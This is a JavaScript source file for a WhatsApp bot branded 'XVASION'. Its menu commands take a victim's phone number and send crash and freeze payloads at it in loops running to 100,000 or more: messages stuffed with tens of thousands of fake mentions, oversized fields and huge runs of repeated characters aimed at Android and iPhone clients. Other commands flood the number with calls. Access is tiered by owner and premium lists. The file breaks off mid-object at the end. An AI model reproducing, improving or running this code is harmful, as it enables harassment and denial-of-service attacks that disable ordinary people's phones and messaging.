require('./config');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');











const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");









// MODULE
module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? sock.user.id.split(":")[0] || sock.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';










// FUNCTION GRUB
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");










// DATABASE DAN LAIN LAIN
const botNumber = await sock.decodeJid(sock.user.id);
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./library/database/moderator.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))

const isPremium = premium.includes(m.sender)
const isOwner = newOwner.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);










// FUNCTION GRUB 2
const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;










// FUNCTION SAYA
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./library/function');










// FUNCTION WAKTU
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");










// EMOJI ACAK
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]










// FOTO BOT
const thumb = fs.readFileSync('./library/assets/thumb.jpg');











// SEDIKIT TAMPILAN
const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `𝐗𝐕𝐀𝐒𝐈𝚯𝐍`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

const loli = {
  key: {
    fromMe: false,
    participant: "10000000000@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "0",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝐗𝐕𝐀𝐒𝐈𝚯𝐍`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}










// TEKS REPLI
const reply = (teks) => { 
sock.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐗𝐕𝐀𝐒𝐈𝚯𝐍`,"body": `version: 3.0 ~Vip`, "previewType": "PHOTO","thumbnailUrl": `https://files.catbox.moe/for2o3.jpg`}}}, { quoted: hw})} 










// REAKSI
const reaction = async (jidss, emoji) => {
sock.sendMessage(jidss, { react: { text: emoji, key: m.key }})}










// CASE DAN MENU
switch (command) {
case 'menu': {
let menu = `╔─「 𝐗𝐕𝐀𝐒𝐈𝚯𝐍 」
├─➤ status: ${isOwner ? "Owner" : isPremium ? "Premium" : "No Acces"}
├─➤ version: 3.0 Vip
├─➤ username: ${pushname}
╚─═─═─═─═─═─═─⬣

╔─「 *ANDROID MENU* 」
├─➤ silentc ϟ invis delay
├─➤ dexter ϟ invis delay v2
├─➤ kitsune ϟ hard invis delay
├─➤ cursed ϟ bulldozer delay
├─➤ jailbreak ϟ calling delay
├─➤ potential ϟ freeze system
╚─═─═─═─═─═─═─⬣

╔─「 *IPHONE MENU* 」
├─➤ plague ϟ ios freeze
├─➤ xcios ϟ ios delay
╚─═─═─═─═─═─═─⬣

╔─「 *OWNER MENU* 」
├─➤ addmod ϟ add moderator
├─➤ delmod ϟ delete moderator
├─➤ addprem ϟ add premium
├─➤ dellprem ϟ delete premium
╚─═─═─═─═─═─═─⬣`
                sock.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: "𝐕𝐚𝐬𝐢𝐨𝐧 ϟ 𝐌𝐚𝐭𝐫𝐢𝐱",
                    mimetype: "application/pdf",
                    fileLength: 1,
                    pageCount: 1,
                    caption: menu,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "𝐕𝐚𝐬𝐢𝐨𝐧 ϟ 𝐌𝐚𝐭𝐫𝐢𝐱🕊️",
                            newsletterJid: `120363369349376182@newsletter`,
                        },
                        externalAdReply: {  
                            title: "𝐗𝐕𝐀𝐒𝐈𝚯𝐍", 
                            body: "this script created by zepy",
                            thumbnailUrl: `https://files.catbox.moe/for2o3.jpg`,
                            sourceUrl: "https://t.me/zepyytry", 
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: null })
            };
            break          









// SILENTC BUG CASE
case 'silentc': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayhard(target, mention);
    await invispaymentdelay(sock, target, mention);
    await bulldozer2(sock, target, mention);
    await protocolbug7(target, mention);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// DEXTER BUG CASE
case 'dexter': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayhard(target, mention);
    await invispaymentdelay(sock, target, mention);
    await bulldozer2(sock, target, mention);
    await protocolbug7(target, mention);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// KITSUNE BUG CASE
case 'kitsune': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayhard(target, mention);
    await invispaymentdelay(sock, target, mention);
    await bulldozer2(sock, target, mention);
    await protocolbug7(target, mention);
    await buttonhardinvis(target, mention);
    await buttonhardinvis(target, false);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// CURSED BUG CASE
case 'cursed': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayhard(target, mention);
    await invispaymentdelay(sock, target, mention);
    await bulldozer2(sock, target, mention);
    await protocolbug7(target, mention);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// JAILBREAK BUG CASE
case 'jailbreak': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayhard(target, mention);
    await invispaymentdelay(sock, target, mention);
    await bulldozer2(sock, target, mention);
    await protocolbug7(target, mention);
    await spamcall(target);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// POTENTIAL BUG CASE
case 'potential': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 999999999; i++) {
    await spamcall(target);
    await spamcall(target);
    await spamcall(target);
    await spamcall(target);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// PLAGUE BUG CASE
case 'plague': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await freezeiphone(target);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break









// XCIOS BUG CASE
case 'xcios': {
if (!isBot && !isPremium && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!q) return reply(`ⓘ Example: ${prefix+command} 62×××`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let mention = true
reply(`╔─「 *INFORMATION* 」
├─➤ target: ${pepec}
├─➤ status: success
├─➤ type: ${command}
╚─═─═─═─═─═─═─⬣`)
// STARTING FUNCTION/BUG
for (let i = 0; i <= 100000; i++) {
    await delayiphone(target);
    await sleep(1000)
    }
sock.sendMessage(from, {react: {text: "🍃", key: m.key}})
}
break










// ADD MODERATOR CASE
case "addmod":{
if (!isBot && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sock.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`ⓘ Invalid Number`)
newOwner.push(prrkek)
fs.writeFileSync("./library/database/moderator.json", JSON.stringify(newOwner))
reply(`ⓘ ${prrkek} Added To Moderator Acces`)
}
break










// DELETE MODERATOR CASE
case "delmod":{
if (!isBot && !isOwner) return reply(`ⓘ You Don't Have Access`)
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = newOwner.indexOf(ya)
newOwner.splice(unp, 1)
fs.writeFileSync("./library/database/moderator.json", JSON.stringify(newOwner))
reply(`ⓘ ${ya} Removed From Moderator Acces`)
}    
break










// ADD PREMIUM CASE
case "addprem":{
if (!isBot && !isOwner) return reply("ⓘ You Don't Have Access")
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sock.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`ⓘ Invalid Number`)
premium.push(prrkek)
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium))
reply(`ⓘ ${prrkek} Added To Premium Acces`)
}
break










// DELETE PREMIUM CASE
case "delprem":{
if (!isBot && !isOwner) return reply("ⓘ You Don't Have Access")
if (!args[0]) return reply(`ⓘ Example: ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium))
reply(`ⓘ ${ya} Removed From Premium Acces`)
}
break











// FUNCTION REPEATED
async function main() {
  await sleep(1000);
}










// FUNCTION SPAM CALL
async function spamcall(target) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
    try {
        await sock.offerCall(target);
    } catch (error) {
    }
}










// FUNCTION DELAY HARD
async function delayhard(target, mention) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
  const generateMessage = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
            44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
            153, 93, 211,
          ]),
          fileLength: 432722,
          seconds: 20,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145,
          ]),
          fileEncSha256: Buffer.from([
            29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
            131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
            83, 153,
          ]),
          directPath:
            "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "OtaXxx - INVISIBLE" },
            content: undefined,
          },
        ],
      }
    );
  }
}










// FUNCTION INVIS PAYMENT DELAY
async function invispaymentdelay(sock, target, mention) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}










// FUNCTION BULLDOZER 2
async function bulldozer2(sock, target, mention) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}










// FUNCTION PROTOCOL BUG 7
async function protocolbug7(target, mention) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "🇯🇲 𝐕𝐀𝐒𝐈𝐎𝐍 ϟ 𝐓𝐑𝐀𝐒𝐇 ..."
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}










// FUNCTION DELAY IPHONE
async function delayiphone(target) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "🇯🇲 𝐕𝐀𝐒𝐈𝐎𝐍 ϟ 𝐓𝐑𝐀𝐒𝐇 ..." + "ꦻ࣯࣯".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}









// FUNCTION FREEZE IPHONE
async function freezeIphone(target) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "🇯🇲 𝐕𝐀𝐒𝐈𝐎𝐍 ϟ 𝐓𝐑𝐀𝐒𝐇 ..." + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}









// FUNCTION BUTTON HARD INVIS
async function buttonhardinvis(target, mention) {
console.log(`ϟ VASION - SENDING BUG TO ${target}`);
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const xataishere = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Kita Usahakan Nanti.mp3",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Kita Usahakan Nanti.Mp4"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
